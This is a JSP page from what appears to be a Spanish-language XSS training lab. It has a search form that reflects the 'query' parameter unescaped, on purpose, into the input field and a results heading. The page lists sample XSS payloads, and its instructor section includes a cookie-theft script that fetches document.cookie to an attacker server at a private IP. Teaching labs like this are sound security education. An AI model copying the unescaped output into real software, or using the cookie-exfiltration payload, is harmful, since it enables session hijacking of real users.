<%-- 
    Document   : search
    Created on : Oct 14, 2025, 5:49:57 PM
    Author     : jose
--%>

<%@page import="org.owasp.encoder.Encode"%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<html>
    <head>
        <title>Búsqueda Vulnerable - XSS Lab</title>
        <style>
            body {
                font-family: Arial;
                margin: 40px;
            }
            .vulnerable {
                background: #f8d7da;
                padding: 10px;
                margin: 10px 0;
            }
            .result {
                background: #e9ecef;
                padding: 15px;
                margin: 10px 0;
            }
            code {
                background: #eee;
                padding: 2px 5px;
            }
        </style>
    </head>
    <body>
        <h1>🔍 Sistema de Búsqueda (Vulnerable)</h1>

        <div class="vulnerable">
            <strong>VULNERABILIDAD:</strong> No hay sanitización en parámetro "query"
        </div>
<%Encode.forHtml("ssss");%>
        <form method="GET" action="search.jsp">
            <input type="text" name="query" placeholder="Buscar productos..." 
                   value="<%= request.getParameter("query") != null ? request.getParameter("query") : ""%>"
                   size="50">
            <button type="submit">Buscar</button>
        </form>

        <%
            String query = request.getParameter("query");
            if (query != null && !query.trim().isEmpty()) {
        %>
        <div class="result">
            <h2>Resultados para: <%= query%></h2>
            <p>Se encontraron 0 resultados para su búsqueda.</p>

            <div style="background: #d4edda; padding: 10px; margin: 10px 0;">
                <strong>HTML generado (solo para visualización):</strong><br>
                <code>&lt;h2&gt;Resultados para: 
                    <%
                        // ESCAPAR el contenido para mostrarlo como texto
                        String displayQuery = query
                                .replace("&", "&amp;")
                                .replace("<", "&lt;")
                                .replace(">", "&gt;")
                                .replace("\"", "&quot;")
                                .replace("'", "&#39;");
                    %>
                    <%= displayQuery%>&lt;/h2&gt;</code>
            </div>
        </div>
        <%
            }
        %>

        <hr>
        <h3>🎯 Ejemplos para probar:</h3>
        <ul>
            <li><a href="search.jsp?query=<script>alert('XSS')</script>">search.jsp?query=&lt;script&gt;alert('XSS')&lt;/script&gt;</a></li>
            <li><a href="search.jsp?query=<img src=x onerror=alert(1)>">search.jsp?query=&lt;img src=x onerror=alert(1)&gt;</a></li>
            <li><a href="search.jsp?query=<svg onload=alert(document.domain)>">search.jsp?query=&lt;svg onload=alert(document.domain)&gt;</a></li>
            <li><a href="search.jsp?query=<h1>Hacked</h1>">search.jsp?query=&lt;h1&gt;Hacked&lt;/h1&gt;</a></li>
        </ul>

        <div style="background: #fff3cd; padding: 15px; margin: 20px 0;">
            <h3>💡 Para el Instructor - Payloads Educativos:</h3>
            <ul>
                <li><strong>Básico:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                <li><strong>Con información:</strong> <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></li>
                <li><strong>Event Handler:</strong> <code>&lt;img src="x" onerror="alert('XSS')"&gt;</code></li>
                <li><strong>SVG:</strong> <code>&lt;svg onload="alert(1)"&gt;</code></li>
                <li><strong>Robo de cookies:</strong> <code>&lt;script&gt;fetch('http://192.168.0.100:8080/attackers-app/log.jsp?cookie='+document.cookie)&lt;/script&gt;</code></li>
            </ul>
        </div>

        <p><a href="index.jsp">← Volver al inicio</a></p>
    </body>
</html>